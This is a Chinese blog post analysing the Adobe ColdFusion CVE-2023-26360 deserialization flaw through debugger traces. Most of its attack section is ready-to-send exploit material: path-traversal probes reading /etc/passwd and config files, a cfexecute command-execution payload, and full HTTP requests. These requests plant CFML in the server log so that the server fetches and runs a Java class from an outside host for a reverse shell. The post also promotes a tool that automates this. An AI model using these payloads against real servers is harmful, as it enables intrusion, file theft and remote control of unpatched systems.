#  Adobe ColdFusion （CVE-2023-26360 入侵了美国联邦民事执行局）漏洞分析，实现反弹思路，   
原创 赛赛  W啥都学   2024-09-03 21:36  
  
这个漏洞分析挺有意思的，也浪费了我不少时间去研究  
  
后面会分享一下我的反弹思路  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7kGL05YTyKoVQVNrfXDwprWtlOCmfBaOb4CcrKzKTchzN54p1DaPv5g/640?wx_fmt=gif&from=appmsg "")  
# 事件  
  
在2023年12月5日美国网络安全和基础设施安全局 (CISA)发出警告称，黑客利用 Adobe ColdFusion （CVE-2023-26360）的安全漏洞黑进去了美国政府（联邦民事执行局）服务器  
  
复现分析环境：Adobe ColdFusion 2021.0.05.330109版本，系统：windows 10  
  
漏洞影响：Adobe ColdFusion <=2021.0.05版本，Adobe ColdFusion 2018 <=2021.0.15版本  
# 调试环境搭建  
### 开启Debugging Logging  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7qsnQDhWGt2cFpcZddhKn4yaN0rIGibSteTY69lOXfQzuGBzTWmibhljA/640?wx_fmt=png&from=appmsg "null")  
  
## 设置 IDEA  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7iaju331khhBOjQvg8HDocI6ZEVUexu6hWLjHF0Ty7IRxB2YTJyUQ5ibg/640?wx_fmt=png&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7rUhwEKzDrCxibo86YRo5Y81YPG2b6ZqJwHicjc7DxR9oJuHicmVKQZWfA/640?wx_fmt=png&from=appmsg "null")  
  
## 添加远程调试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7qsI857Dn79Lb3G8FwdpsOpRT7gbEicvUls6MtaDggSa2o6HW1G3ZoyQ/640?wx_fmt=png&from=appmsg "null")  
  
  
启动调试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7BFlz4ibZGj1Rfgno04FLXIbvnIEAWGAb8TwOaxqzCtX7IpdjhmgMk6A/640?wx_fmt=png&from=appmsg "null")  
  
# 漏洞和补丁分析  
  
我们看一下触发的漏洞的地方，我只要看这个漏洞触发的这个地方  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7FahkqodPfElvAjPOD5afaCjZXQwh3xqmUbO4joMe8XmdGDxZEqCoNg/640?wx_fmt=png&from=appmsg "null")  
  
调试往下走，可以看到读取到了系统文件的内容了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny737JQkwOoulP9yt8ic1tU9Z5ttuib9QM2l1Jf51HBSCqjeHHQcObiaAK3A/640?wx_fmt=png&from=appmsg "null")  
  
我们从上面的调试分析可以看出来这个漏洞的主要点就是这个ComponentFilter过滤器执行了Map vars = (Map)JSONUtils.deserializeJSON(args.remove("_variables"));这个args.remove("_variables")就是我们传入的路径  
  
我们看一下补丁信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny72HialQOqdmj5AcPLw5rUcaNSPvwZHvGWYNaeVddHI0QGV0T5LXvicsBA/640?wx_fmt=png&from=appmsg "null")  
  
然后我在服务器上的/创建一共a文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7r7dnwUhczZQKRicZicTtBibYpytS6Z3JlIxbLq7dAxDfEtVqCogXGQPmA/640?wx_fmt=png&from=appmsg "null")  
  
我这边构建一共代码如下  
```
Map<String, Object> argss = new HashMap<>();
argss.put("_variables", "{\"_metadata\":{\"classname\":\"../../../../../../../../../../../../a\",\"_variables\":[]}}");
JSONUtils.deserializeJSON(argss.remove("_variables"));
NeoJspWriter neoJspWriter = (NeoJspWriter) context.pageContext.out;
neoJspWriter.buffer.toString();
```  
  
执行看一下结果可以看见读取出来了a文件内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7Pj9zXeVGhumBAiaoIBvibC69wC9tpiadzBdP0b5IWR3253lvD7Xk8AnyA/640?wx_fmt=png&from=appmsg "null")  
  
想深入研究我们为什么会这样，我们可以跟进去JSONUtils.deserializeJSON(argss.remove("_variables"));代码里面的deserializeJSON方法  
  
调试看一下，走到了deserializeJSON  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7V4ByumRibUY5RFBVfNkicdpCG0ymvzIMWYWsc0EDfKLiamSH9SicYCxbcA/640?wx_fmt=png&from=appmsg "null")  
  
我们继续往下，走到parseJSON这个地方解析我们的**JSON 字符串**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7oBibBzibjCoO9cPaWoSxy4tXuqQrRece24npY3Pk2a4ZvLb2xWqqtvOw/640?wx_fmt=png&from=appmsg "null")  
  
我们调试跟进去parseJSON方法  
  
然后看一下这个函数的主要目的就是叫JSON解析成JAVA对象  
  
可以看见代码Object cfml = parseObject(state);**解析 JSON 对象**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7U16f5N5lSqrfG1UgENFWq2rbm988JnZlNNvcnYMtyZb0zq9lczo5KA/640?wx_fmt=png&from=appmsg "null")  
  
我们继续往parseObject方法里面跟进去，解析JSON对象  
  
上面的但是处理json数据的，走到如下图的的if判断我们JSON包含 _metadata 字进入convertToTemplateProxy方法里面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7HzmmHd27q1cqZPdtvRWusb2ack3SnLG9WF1tHEuIZJX8CvX8YVicIJQ/640?wx_fmt=png&from=appmsg "null")  
  
看一下convertToTemplateProxy方法代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny788wkPJJ2PW9qOIFIurYib3IMhUKBMjnf2D0AzsctWBnLCbFrYBdVgcQ/640?wx_fmt=png&from=appmsg "null")  
  
代码  
```
private staticObjectconvertToTemplateProxy(Struct s){
try{
Objectmetadata= s.get("_metadata");
FusionContextcontext=FusionContext.getCurrent();
if(metadata !=null){
StringserverClass=(String)((Map)metadata).get("classname");
StringcontextPath= context.getRequest().getContextPath();
if(!serverClass.startsWith("/")){
                serverClass = serverClass.substring(serverClass.indexOf("//")+2);
                serverClass = serverClass.substring(serverClass.indexOf("/")+1);
}

if(contextPath !=null&&!"".equals(contextPath)&& serverClass.startsWith(contextPath)){
                serverClass = serverClass.substring(contextPath.length());
}

FilepageFile=newFile(context.getRealPath(serverClass,true));
TemplateProxytp=TemplateProxyFactory.resolveFile(context.pageContext, pageFile);
ObjectvarObj= s.get("_variables");
Mapvars= varObj instanceofArray?null:(Map)varObj;
if(vars !=null){
                tp.getVariableScope().putAll(vars);
}

return tp;
}
}catch(Throwable var10){
}

return s;
}
```  
  
简单解读一下上面的代码  
  
获取 _metadata 字段的值  
```
Object metadata = s.get("_metadata");
```  
  
获取到metadata之后调用，获取classname里面的数据  
```
String serverClass = (String)((Map)metadata).get("classname");
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7QYIbLOia1WuqwJcpprtqMszUm7Pe1LODSnKXmMSUuguvKMWBDIlg87w/640?wx_fmt=png&from=appmsg "null")  
  
是下面的就是**处理 serverClass 字符串的前缀**  
```
if (!serverClass.startsWith("/")) {
    serverClass = serverClass.substring(serverClass.indexOf("//") + 2);
    serverClass = serverClass.substring(serverClass.indexOf("/") + 1);
}
```  
  
然后走到  
```
File pageFile=newFile(context.getRealPath(serverClass,true));// 创建一个File对象调试执行如下
FilepageFile=newFile("../../../../../../../../../../../etc/passwd");

TemplateProxytp=TemplateProxyFactory.resolveFile(context.pageContext, pageFile); // 重点，生成动态内容
```  
  
我们重点看一下TemplateProxy tp = TemplateProxyFactory.resolveFile(context.pageContext, pageFile);这个代码，跟进去  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny756uy5gJDFIBIZ0cIU5yibbbHaMLNoarJ3U85XSkRIBvgU1ZUKOJxiacA/640?wx_fmt=png&from=appmsg "null")  
  
我们主要看一下下面这个代码就是动态地加载  
```
CfJspPage page = getCFCInstance(servletContext, canonicalResolvedFile, fullName);
```  
  
我们跟进去到了page = TemplateClassLoader.newInstance(servletContext, canonicalFile.getPath(), null);  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7pCWXuseZ1qOxf0bDQ32Ab4RyiakA4lLMuPN3TszHMlUEDX770mfsTmQ/640?wx_fmt=png&from=appmsg "null")  
  
我们进入这个newInstance方法里面，可以看见有这个indClass是这个方法是动态类加载，我们可以进入看一下子他是这么实现的  
  
我们看一下indClass是怎么实现的，可以看见跑到了c = (Class)classCache.get(realPath);这个代码，可以看见返回的是已编译的类，如果缓存中存在，则直接返回  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny73uictGIEyKNHzsIPkhERQic8bLSNicszPSYn1ULpVffeIKbMf3iaeZJMJA/640?wx_fmt=png&from=appmsg "null")  
  
我们继续往c = (Class)classCache.get("/a.log");里面进，看怎么写的  
  
看一下下面代码目的是在启用统计信息或其他监控特性时执行不同的缓存获取操作  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7Dh2keIt6aKqCXquqBdbE7QAjatoUg64IrYquu6e8kp2EKs6T06xFVw/640?wx_fmt=png&from=appmsg "null")  
  
然后进入get_statsOff方法里面，可以看见下面有一个判断如果第一次加载了有这个缓存，如果有就返回这个缓存，如果没有他会重新获取加载，就是说如果你比如第一个执行了/etc/passwd读取这个文件内容了，当下一次执行的时候这个里面就有缓存了，if判断会变成真返回这个缓存  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny79SJGjcdyfVRibtIbTr2Z0aM6WgiaOCU06c10fpMOaiazvCX0x7YPBciaiaA/640?wx_fmt=png&from=appmsg "null")  
  
如果没有执行过，重新加载if就是不成立，执行下面的，走到this.reap()这个是没有获取到缓存对象返回空这个不重要，重要的是value = this.fetch(key);  
  
fetch会重新加载数据  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7laRSIQJmfwF8ta4q97dAuYiaJGAnwqnIHdPHDkmKCyXTMsFoDktMS5Q/640?wx_fmt=png&from=appmsg "null")  
  
我们可以进去看看可以看一下进入了fetch用于动态加载类的代码，看一下下面圈住的返回的就是获取的/etc/passwd的字节码文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7Qm9uNaEob6SsaJ7IqcOgrcjIudbhq6rCNkAQThibNPJAUeUav1nS0rw/640?wx_fmt=png&from=appmsg "null")  
  
把这个执行的值拿出来，如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny77fbZ4tzu4wkge6rnVhRjfsriacdtBv0kedSm0qgxVtqZGZg2YN4qZicQ/640?wx_fmt=png&from=appmsg "null")  
  
然后看这个动态加载类的源码  
```
import coldfusion.runtime.AttributeCollection;
import coldfusion.runtime.CFPage;
import coldfusion.runtime.CfJspPage;
import javax.servlet.jsp.JspWriter;
import javax.servlet.jsp.tagext.Tag;

publicfinalclasscfa1233795extendsCFPage{

publicstaticfinalObjectmetaData=newAttributeCollection(newObject[]{"Functions",newObject[0],"Properties",newObject[0]});


publicfinalObjectgetMetadata(){
return metaData;
}

protectedfinalObjectrunPage(){
    out =((CfJspPage)this).pageContext.getOut();
    parent =((CfJspPage)this).parent;
((CfJspPage)this).pageContext.setPageEncoding("Cp1252");
    out.write("读取的文件");
returnnull;
}

}
```  
  
我们看到上面的调用了CfJspPage这个东西，响应给给用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7choz9dW2NMgBxFuJhy9UublkLibV8SNbXk8MDD1bYk9O1Yb4w7m1uDw/640?wx_fmt=png&from=appmsg "null")  
# 触发漏洞的绕过  
  
我们在，详细看一下这个漏洞触发的条件  
  
看一下安装路径下的/cfusion/wwwroot/WEB-INF/web.xml  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7hWtawDB7ff73HJ37Y9I3ppQIwrGRcJjfwZUXCUeZcX55LjjrlxeI3Q/640?wx_fmt=png&from=appmsg "null")  
  
http://192.168.56.110:8500/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfc?method=foo&_cfclient=true访问文件的请求路径会触发 coldfusion.xml.rpc.CFCServlet 类来处理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7gaKBtUrgXewPbPPlezJ2BJWoC4HyWnh4Ft8nZGSENlfqx3wJ8EKpGw/640?wx_fmt=png&from=appmsg "null")  
  
如果你们想看他是怎么发到，可以自行看一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7AzqEXVPZwqJQghtQ4NyP8IBZW2YyPsT5raSawO9GRU3OFVSQcXhkRg/640?wx_fmt=png&from=appmsg "null")  
  
请求的后缀 .cfc会到ComponentFilter来处理  
  
主要看一下子ComponentFilter  
  
1、请求后缀不能是cfr  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7hAcmqlKMFwLxElWibQ2LvQWfPO754R4zvJ3XXgdI9RJx34W0aib79zaQ/640?wx_fmt=png&from=appmsg "null")  
  
2、method参数不能是空  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7v0rM7kR8KnJxHQtyG4Ub0mVO7yfCaMxPqJJ4WLxSObicukxDsmibxZeA/640?wx_fmt=png&from=appmsg "null")  
  
3、_cfclient参数是true或者是yes  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7HcBDCe1AHydJLwmLXRIvQf2SoWICMQQ3l4SgTDLKesxp3hNqrlW6pw/640?wx_fmt=png&from=appmsg "null")  
  
image-20240829160834831  
  
为什么呢看一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7A9Ric7OkSwqXZPCkPvzG7LpDbNWuSfnjXnk0CDVicG9gp3VQKugNYM9w/640?wx_fmt=png&from=appmsg "null")  
  
最终达到了文件读取效果  
# 打出最好的漏洞效果  
## 判断漏洞是否存在（文件读取）  
  
1、针对windows和linux有回显通用判断POC  
```
_variables={"_metadata":{"classname":"../lib/neo-security.xml","_variables":[]}}
_variables={"_metadata":{"classname":"l/../logs/coldfusion-out.log"},"_variables":[]}
```  
  
2、针对有回显linux启动位置路径会有不同判断  
```
_variables={"_metadata":{"classname":"../../../../../../../../../../../../etc/passwd","_variables":[]}}
```  
  
3、针对windows和linux无回显判断  
```
_variables=<cfscript>fileWrite('../../../../../wwwroot/cf_scripts/aaaa.txt','aaaaaa');</cfscript>  //写入文件
https:/xxxxx.com/cf_scripts/aaaa.txt// 访问该文件存在说明漏洞存在
```  
## 命令执行  
```
_variables=<cfexecute name='ipconfig' outputFile='c:\a.txt' ></cfexecute>
```  
## 反弹shell（代码执行）  
  
漏洞原理是我们构建CFML数据客户端请求的数据会保存到服务器的coldfusion-out.log，这个目录会记录请求的错误的信息，coldfusion-out.log文件里面就有我们写入的代码了，然后我们使用classname读取执行这个日志文件达到代码执行的效果  
  
这边我有一个思路，就是通过把恶意的class放到服务器上面，然后下载保存调用这个class文件，调用通过上面的这个漏洞他会去动态的加载类，去调用执行我们的class文件  
  
这个写一个脚本，这个脚本会生成一个压缩包，这个压缩包里面  
  
压缩包code目录下  
```
utilize
    ├── address
    └── Poc.class
```  
  
Poc.java里面主要存放反弹的代码  
  
address存放地址和端口  
  
我们需要构建好一个java的字节码文件，然后设置反弹的IP和端口，然后开启web  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7kGL05YTyKoVQVNrfXDwprWtlOCmfBaOb4CcrKzKTchzN54p1DaPv5g/640?wx_fmt=gif&from=appmsg "")  
  
发写入日志文件的错误请求  
```
POST //cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=zfgea&_cfclient=trueHTTP/1.1
Host: 192.168.56.105:8500
User-Agent: Mozilla/5.0(Macintosh;IntelMac OS X 10_14_3)AppleWebKit/605.1.15(KHTML, like Gecko)Version/12.0.3Safari/605.1.15
Content-Length: 816
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

_variables=%7b%3ccftry%3e%3ccfset%20szlh%20%3d%20createObject%28%27java%27%2c%27java.net.URL%27%29.init%28%27http://192.168.191.58:8888/GjfZgo%27%29/%3e%3ccfset%20cafb%20%3d%20createObject%28%27java%27%2c%27java.lang.reflect.Array%27%29/%3e%3ccfset%20ireh%20%3d%20cafb.newInstance%28szlh.getClass%28%29%2c1%29/%3e%3ccfset%20cafb.set%28ireh%2c0%2cszlh%29/%3e%3ccfset%20fxlt%20%3d%20createObject%28%27java%27%2c%27java.net.URLClassLoader%27%29.init%28ireh%2cjavaCast%28%27null%27%2c%27%27%29%29/%3e%3ccfset%20fxlt.loadClass%28%27code.Payload%27%29.newInstance%28%29.main%28javaCast%28%27null%27%2c%27%27%29%29/%3e%3ccfcatch%20type%3d%27any%27%3e%3c/cfcatch%3e%3ccffinally%3e%3ccffile%20action%3d%27write%27%20file%3d%27%23GetCurrentTemplatePath%28%29%23%27%20output%3d%27%27%3e%3c/cffile%3e%3c/cffinally%3e%3c/cftry%3e
```  
  
看一下日志写进去了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7KoeC7qFDfxp6FDjgp5omZvEibpmlpwCSlibk07Uae8ATicL7Be2JNV91Q/640?wx_fmt=png&from=appmsg "")  
  
发送执行日志文件  
```
POST //cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=zfgea&_cfclient=trueHTTP/1.1
Host: 192.168.56.105:8500
User-Agent: Mozilla/5.0(Macintosh;IntelMac OS X 10_14_3)AppleWebKit/605.1.15(KHTML, like Gecko)Version/12.0.3Safari/605.1.15
Content-Length: 85
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

_variables={"_metadata":{"classname":"l/../logs/coldfusion-out.log"},"_variables":[]}
```  
  
看一下效果  
### 自动化生成工具  
  
上面的功能实现起来是非常非常麻烦的我写了一个自动化生成的工具，构建java的字节码文件，然后设置反弹的IP和端口，然后开启web  
  
然后我写一个工具项目地址：关注公众号回复CVE-2023-26360  
  
工具使用  
```
工具名称 -host 指定反弹IP -port 指定反弹端口 -p 指定http端口（默认8888）
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7PtW1ugCibymVibx0JMic9hWVKPcK7K19vxSiaFAGUy4ibJxyCaLVGxIB9lw/640?wx_fmt=png&from=appmsg "null")  
  
看一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7FrtqZn5aHhtPjsRAA4oZ7ia9hjXhMeFErbyPeaEMB2Noa6CdvFNlSeQ/640?wx_fmt=png&from=appmsg "null")  
  
然后我们请求写入日志错误代码，下面的post的数据部分的http://192.168.191.58:8888/GjfZgo改成服务启动在的地址  
```
POST //cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=zfgea&_cfclient=trueHTTP/1.1
Host: 192.168.56.105:8500
User-Agent: Mozilla/5.0(Macintosh;IntelMac OS X 10_14_3)AppleWebKit/605.1.15(KHTML, like Gecko)Version/12.0.3Safari/605.1.15
Content-Length: 816
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

_variables=%7b%3ccftry%3e%3ccfset%20szlh%20%3d%20createObject%28%27java%27%2c%27java.net.URL%27%29.init%28%27http://192.168.191.58:8888/GjfZgo%27%29/%3e%3ccfset%20cafb%20%3d%20createObject%28%27java%27%2c%27java.lang.reflect.Array%27%29/%3e%3ccfset%20ireh%20%3d%20cafb.newInstance%28szlh.getClass%28%29%2c1%29/%3e%3ccfset%20cafb.set%28ireh%2c0%2cszlh%29/%3e%3ccfset%20fxlt%20%3d%20createObject%28%27java%27%2c%27java.net.URLClassLoader%27%29.init%28ireh%2cjavaCast%28%27null%27%2c%27%27%29%29/%3e%3ccfset%20fxlt.loadClass%28%27code.Payload%27%29.newInstance%28%29.main%28javaCast%28%27null%27%2c%27%27%29%29/%3e%3ccfcatch%20type%3d%27any%27%3e%3c/cfcatch%3e%3ccffinally%3e%3ccffile%20action%3d%27write%27%20file%3d%27%23GetCurrentTemplatePath%28%29%23%27%20output%3d%27%27%3e%3c/cffile%3e%3c/cffinally%3e%3c/cftry%3e
```  
  
然后执行日志里面的代码，固定的写死的直接发送  
```
POST //cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=zfgea&_cfclient=trueHTTP/1.1
Host: 192.168.56.105:8500
User-Agent: Mozilla/5.0(Macintosh;IntelMac OS X 10_14_3)AppleWebKit/605.1.15(KHTML, like Gecko)Version/12.0.3Safari/605.1.15
Content-Length: 85
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

_variables={"_metadata":{"classname":"l/../logs/coldfusion-out.log"},"_variables":[]}
```  
  
执行看一下，上线了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b76VA5DEYFBb9aiabDGjVs8fj0aOvQny7iaHwib6vcKxMxl86z9yz0XuiaDue8GaL6B3ZFs5UM1vmK2nHBlrjj8pFA/640?wx_fmt=png&from=appmsg "null")  
# 坑  
  
我这个经过多次测试发现，读取回显可能每个版本和系统是有差别的，有的可以回显示有的无法回显，有的可以反弹有的不行  
  
反弹可能写入日志后可能会导致每次启动都会加载这个日志去请求你的服务器，还有可能只能反弹一次就不能在反弹了都是有可能的  
  
## 免责声明  
  
\1. 该安全文章/工具仅供技术研究和教育用途。使用该工具时，请遵守适用的法律法规和道德准则。  
  
\2. 该文章/工具可能会涉及安全漏洞的测试和渗透测试，但请在授权的范围内使用，否则和作者无关。  
  
\3. 使用该文章/工具可能会涉及到一定的风险和不确定性，用户应该自行承担使用该工具所带来的风险。  
  
\4. 使用本文章/工具的用户应自行承担一切风险和责任。开发者对于用户使用本工具所产生的后果不承担任何责任。  
  
